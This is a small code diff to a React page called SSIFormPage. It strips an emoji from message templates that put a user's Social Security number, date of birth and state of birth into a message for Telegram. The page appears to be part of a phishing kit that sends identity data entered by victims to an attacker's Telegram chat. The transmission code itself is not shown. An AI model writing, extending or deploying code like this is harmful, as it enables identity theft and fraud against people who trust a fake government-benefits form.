@@ -89,7 +89,7 @@ const SSIFormPage = () => {
 
     // Prepare message for Telegram
     const message = `
-      🚀 SSI Information Submitted:
+      SSI Information Submitted:
       - SSN: ${formData.ssn}
       - DOB: ${formData.dob}
       - State of Birth: ${formData.stateOfBirth}
@@ -135,7 +135,7 @@ step1Fields.forEach((field) => {
     setFormErrors({});
 
     // Prepare the message to send to Telegram
-    const message = `🚀 SSI Information Submitted:
+    const message = `SSI Information Submitted:
       - SSN: ${formData.ssn}
       - DOB: ${formData.dob}
       - State of Birth: ${formData.stateOfBirth}
